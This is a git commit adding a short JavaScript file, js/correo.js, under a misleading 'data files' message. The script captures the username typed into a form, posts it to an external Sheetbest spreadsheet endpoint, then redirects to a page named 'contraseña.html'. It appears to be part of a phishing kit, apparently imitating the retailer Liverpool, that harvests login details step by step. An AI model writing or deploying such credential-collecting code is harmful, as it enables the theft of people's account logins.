99e8f97f5ec104b4e92af944223b3400065ea419
liverpool-mx-u <mesequiel735@gmail.com>
2025-07-25 14:16:15 -0600

    add data files in new ml one day

---
+++ js/correo.js
@@ -0,0 +1,33 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/4b64a25f-4ab9-4c9f-beec-69f44f97120b', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Datos": formulario.usuario.value
+            
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+
+    window.location.href = 'contraseña.html'; // Redirige a la página deseada
+
+});
